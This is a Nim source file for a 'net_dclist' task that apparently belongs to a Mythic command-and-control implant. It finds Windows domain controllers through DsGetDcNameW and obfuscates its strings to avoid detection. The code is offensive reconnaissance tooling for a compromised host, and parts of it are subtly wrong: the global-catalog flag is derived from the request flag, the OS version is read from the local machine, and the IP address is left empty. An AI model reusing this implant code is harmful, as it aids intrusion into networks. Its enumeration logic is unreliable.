import std/[json, strformat, os]
import ../utils/mythic_responses
import ../utils/debug
import ../utils/strenc

when defined(windows):
  import winim/lean
  import std/widestrs
  
  const
    DS_DIRECTORY_SERVICE_REQUIRED = 0x00000010
    DS_RETURN_DNS_NAME = 0x40000000
    NO_ERROR = 0
  
  type
    DOMAIN_CONTROLLER_INFOW = object
      DomainControllerName: LPWSTR
      DomainControllerAddress: LPWSTR
      DomainControllerAddressType: ULONG
      DomainGuid: GUID
      DomainName: LPWSTR
      DnsForestName: LPWSTR
      Flags: ULONG
      DcSiteName: LPWSTR
      ClientSiteName: LPWSTR
    
    NetDomainController = object
      computer_name: string
      ip_address: string
      domain: string
      forest: string
      os_version: string
      global_catalog: bool
  
  proc DsGetDcNameW(ComputerName: LPCWSTR, DomainName: LPCWSTR, 
                    DomainGuid: ptr GUID, SiteName: LPCWSTR,
                    Flags: ULONG, DomainControllerInfo: ptr ptr DOMAIN_CONTROLLER_INFOW): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc NetApiBufferFree(Buffer: pointer): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc utf16PtrToString(p: LPWSTR): string =
    ## Convert UTF-16 pointer to Nim string
    if p.isNil:
      return ""
    result = $cast[WideCString](p)

proc netDclist*(taskId: string, params: JsonNode): JsonNode =
  ## Get domain controllers
  when defined(windows):
    try:
      # Parse parameters (domain is optional)
      var domain = ""
      if params.kind == JObject and params.hasKey(obf("domain")):
        domain = params[obf("domain")].getStr()
      
      # Default to current domain if not specified
      if domain == "":
        domain = getEnv(obf("USERDNSDOMAIN"), "")
      
      debug &"[DEBUG] net_dclist: domain={domain}"
      
      var dcInfoPtr: ptr DOMAIN_CONTROLLER_INFOW = nil
      var domainW: WideCString = nil
      if domain != "":
        domainW = newWideCString(domain)
      
      let status = DsGetDcNameW(
        cast[LPCWSTR](nil),
        cast[LPCWSTR](domainW),
        cast[ptr GUID](nil),
        cast[LPCWSTR](nil),
        DS_DIRECTORY_SERVICE_REQUIRED or DS_RETURN_DNS_NAME,
        addr dcInfoPtr
      )
      
      if status != NO_ERROR:
        return mythicError(taskId, obf("Failed to get domain controller information: ") & $status)
      
      let dcInfo = dcInfoPtr[]
      
      # Extract DC information
      let computerName = utf16PtrToString(dcInfo.DomainControllerName)
      let domainName = utf16PtrToString(dcInfo.DomainName)
      let forest = utf16PtrToString(dcInfo.DnsForestName)
      let globalCatalog = (dcInfo.Flags and DS_DIRECTORY_SERVICE_REQUIRED) != 0
      
      # Get IP address (simplified - using localhost for now)
      let ipAddress = ""
      
      # Get OS version
      var osVer: OSVERSIONINFOW
      osVer.dwOSVersionInfoSize = DWORD(sizeof(OSVERSIONINFOW))
      discard GetVersionExW(addr osVer)
      let osVersion = &"{osVer.dwMajorVersion}.{osVer.dwMinorVersion}"
      
      # Free the DC info buffer
      discard NetApiBufferFree(dcInfoPtr)
      
      # Create result
      let dcResult = NetDomainController(
        computer_name: computerName,
        ip_address: ipAddress,
        domain: domainName,
        forest: forest,
        os_version: osVersion,
        global_catalog: globalCatalog
      )
      
      # Convert to JSON array
      let resultsJson = %*[{
        obf("computer_name"): dcResult.computer_name,
        obf("ip_address"): dcResult.ip_address,
        obf("domain"): dcResult.domain,
        obf("forest"): dcResult.forest,
        obf("os_version"): dcResult.os_version,
        obf("global_catalog"): dcResult.global_catalog
      }]
      
      return mythicSuccess(taskId, $resultsJson)
      
    except Exception as e:
      return mythicError(taskId, obf("net_dclist error: ") & e.msg)
  else:
    return mythicError(taskId, obf("net_dclist command is only available on Windows"))